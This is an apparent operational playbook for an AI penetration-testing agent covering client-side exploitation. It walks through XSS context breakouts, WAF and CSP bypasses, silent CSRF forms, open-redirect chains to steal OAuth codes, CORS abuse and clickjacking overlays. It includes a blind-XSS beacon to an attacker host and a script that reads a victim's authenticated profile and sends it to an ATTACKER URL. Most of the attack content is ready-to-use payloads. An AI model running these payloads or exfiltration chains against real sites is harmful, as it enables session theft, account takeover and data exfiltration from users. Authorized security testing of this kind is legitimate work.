---
skill: client-side-exploitation-deep-aggressive
mitre_attack_id: T1189
owasp_mapping: [A03, A04, A07]
difficulty: advanced
mode: deep-aggressive
tags: [xss, reflected-xss, stored-xss, dom-xss, blind-xss, csrf, open-redirect, cors, clickjacking, csp-bypass, waf-bypass, browser-validation]
---

# Deep Aggressive Mode Playbook: client-side-agent

> Purpose: This playbook is the deep-aggressive operational doctrine for client-side exploitation. Every payload is executed in a real browser, every bypass chain is attempted, and every finding ships with exfiltration-proof evidence. Reference each class playbook under skills/penetration-testing/.

## Phase 1 — Surface Enumeration

1. Collect all reflection points from web-discover-agent: URL params, POST bodies, headers echoed back, stored values (profile, comments, filenames, upload metadata).
2. Map DOM sources to sinks: `document.URL`, `location.href`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage` -> `document.write`, `innerHTML`, `outerHTML`, `eval`, `setTimeout(string)`, `new Function`, `jQuery .html()/.append()`.
3. Classify each injection point: reflected / stored / DOM; GET / POST; auth-required / public.
4. Fingerprint CSP, cookie flags (SameSite, HttpOnly, Secure), and CORS headers on target responses.
5. Establish an authenticated test session via credential-agent.

## Phase 2 — XSS Context Testing

Reference: skills/penetration-testing/xss.md

1. Break out of each context:
   - Inside tag content: `<script>alert(1)</script>`, `<svg onload=alert(1)>`
   - Inside attribute value: `"><img src=x onerror=alert(1)>`, `" autofocus onfocus=alert(1) x="`
   - Inside attribute with single quotes: `' autofocus onfocus=alert(1) x='`
   - Inside JS string: `';alert(1)//`, `\';alert(1)//`, `</script><script>alert(1)</script>`
   - Inside URL: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
   - Inside JSON: break the string with `\",\"a\":\"` then inject
2. Event handler discovery: `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`, `onauxclick`, `ontoggle`, `ondrag`, `onkeydown`, `onstart` (marquee).
3. Stored-XSS sink testing: submit payload via normal flow, revisit the render location as the victim role.
4. Blind XSS: inject into User-Agent, Referer, X-Forwarded-For, feedback forms, helpdesk tickets; catch with interactsh and a `<script src=https://ATTACKER/px.js>` beacon.

## Phase 3 — WAF and CSP Bypass

1. WAF mutation chains: `%3cscript%3e`, `<scr<script>ipt>`, `<img src=x onerror=alert(1)>` vs `<IMG """><SCRIPT>alert(1)</SCRIPT>`, `%0a%0d` injection, `jav&#x61;script:`, tab/newline in tag `<\tscript\t>`, `<svg/onload=alert(1)>`, mixed-case, `<a href=javas&#99;ript:alert(1)>`, entity-encoded handlers.
2. CSP analysis: `script-src` value enumeration from response headers. If `unsafe-inline` present: any XSS fires directly. If hashes/nonces: look for nonce reuse or reflection. If allowlist hosts: JSONP endpoints (angular, googleapis, custom) to execute `callback=alert(1)` style. If `script-src 'self'`: find upload/stored-XSS to same-origin script file. Check `base-uri` missing -> base tag hijack. Check `object-src` gap -> `<object data=...>`.
3. DOM clobbering: `name=id` attributes to override `window.x`, `document.getElementById` returning attacker-controlled element.

## Phase 4 — Payload Delivery and Browser Validation

1. Execute the payload in playwright headless Chromium:
   - `page.on('dialog', ...)` to confirm `alert()` execution
   - `page.on('console', ...)` to observe `console.log` beacons
   - `page.on('request', ...)` to capture the outbound exfil request
   - screenshot after execution as visual evidence
2. Test in the authenticated context: load the page with victim session cookies.
3. Capture the exfiltration proof: the full URL/body of the request carrying cookies, tokens, or page content.
4. Remove any stored payload after confirmation (unless handed to exploit-poc-agent for the final PoC).

## Phase 5 — CSRF

Reference: skills/penetration-testing/csrf.md

1. Enumerate state-changing requests: profile updates, email/password change, payment actions, admin operations, settings.
2. Token analysis: absent, static per session, predictable (incrementing, timestamp-based, user-hash), regenerated per request, bound to cookie vs body.
3. Validation analysis: token checked on GET only, checked only with `Content-Type: application/x-www-form-urlencoded` (JSON bypass), checked only on some methods, Origin/Referer checked loosely (missing on fetch, `null` origin accepted).
4. SameSite cookie analysis: `SameSite=None` -> full cross-site POST; `SameSite=Lax` -> GET-based CSRF via top-level navigation, or subdomain-based bypass; cookie set without SameSite attribute -> modern default Lax.
5. Silent PoC:
   - Auto-submit form: `<form action=... method=POST><input name=x value=y></form><script>form.submit()</script>`
   - fetch with credentials: `fetch('/action',{method:'POST',credentials:'include',body:...})`
   - GET CSRF via `<img src=/action?x=y>` if the action allows GET
6. Prove the action executed by verifying the state change server-side or in the response.

## Phase 6 — Open Redirect Chaining

Reference: skills/penetration-testing/open-redirect.md

1. Test redirect parameters: `?next=`, `?return=`, `?returnUrl=`, `?redirect=`, `?redirect_uri=`, `?url=`, `?target=`, `?goto=`, `?dest=`, `?continue=`, `?callback=`, `?domain=`.
2. Payload bypasses: `//evil.com`, `https://evil.com`, `https:evil.com` (scheme-less), `https://evil.com%23@target.com`, `/\evil.com`, `\/\evil.com`, `%0d%0a` CRLF, double-encoding `%252f%252f`, param pollution `?redirect=target.com?redirect=evil.com`, `javascript:alert(1)`, `data:text/html,...`.
3. Validate by following the redirect chain in playwright and recording the final URL.
4. Chain to impact:
   - OAuth: `redirect_uri` allowed but path-open -> `redirect_uri=https://target.com/redirect?url=https://evil.com` -> steal authorization code
   - Login: `?next=` open -> phishing (user lands on evil.com copy)
   - Token leak: redirect target receives Referer containing the session token
5. Only use redirects that end on attacker-controlled domains within scope; document the chain.

## Phase 7 — CORS Misconfiguration

Reference: skills/penetration-testing/cors-misconfiguration.md

1. Probe reflected origins: send `Origin: https://evil.com`, `Origin: null`, `Origin: https://evil.com.evil2.com`, `Origin: https://target.com.attacker.com`, `Origin: https://target.com@evil.com`, `Origin: http://target.com` (scheme downgrade), `Origin: https://sub.target.com`.
2. Check response for `Access-Control-Allow-Origin` reflection AND `Access-Control-Allow-Credentials: true` (the dangerous combination).
3. Confirm a cross-origin authenticated read:
   ```html
   <script>
     fetch('https://target.com/api/profile', {credentials:'include'})
       .then(r => r.text()).then(d => new Image().src = 'https://ATTACKER/?d='+btoa(d));
   </script>
   ```
4. Only report as exploitable if ACAO reflects the attacker origin AND credentials are allowed; otherwise note as informational.
5. Test all subdomains and API endpoints for the misconfiguration.

## Phase 8 — Clickjacking

1. Check response headers: `X-Frame-Options: DENY/SAMEORIGIN` and `Content-Security-Policy: frame-ancestors`. Missing both -> vulnerable.
2. Bypasses: `SAMEORIGIN` via framing from a same-site subdomain; `frame-ancestors` without `'self'` gaps; legacy `X-Frame-Options` overridden by CSP; sandbox tricks.
3. Build the overlay PoC:
   - `iframe` of the target action page, `opacity:0`, absolutely positioned over a decoy button
   - victim interaction triggers a state-changing action (password change, transfer, add-admin)
4. Advanced: drag-and-drop clicks, double-click clickjacking (`dblclick`), pointer-events `none` on the iframe, multi-step clickjacking with timing.
5. Document the exact chain of clicks and the resulting state change.

## Phase 9 — Verification and Handoff

1. Every finding validated in a real browser engine with execution/read evidence.
2. Evidence captured: dialog/console/request logs, screenshots, final URLs, exfil URLs.
3. Findings handed to exploit-poc-agent with payloads, PoC, and exact request templates.
4. Session/credential theft chains handed to active-testing-agent.
5. All stored payloads cleaned up; scope respected; no destructive CSRF.

## Skill Library References
- skills/penetration-testing/xss.md
- skills/penetration-testing/csrf.md
- skills/penetration-testing/open-redirect.md
- skills/penetration-testing/cors-misconfiguration.md
- clickjacking / frame-busting bypass (PayloadsAllTheThings clickjacking, client-side research notes)
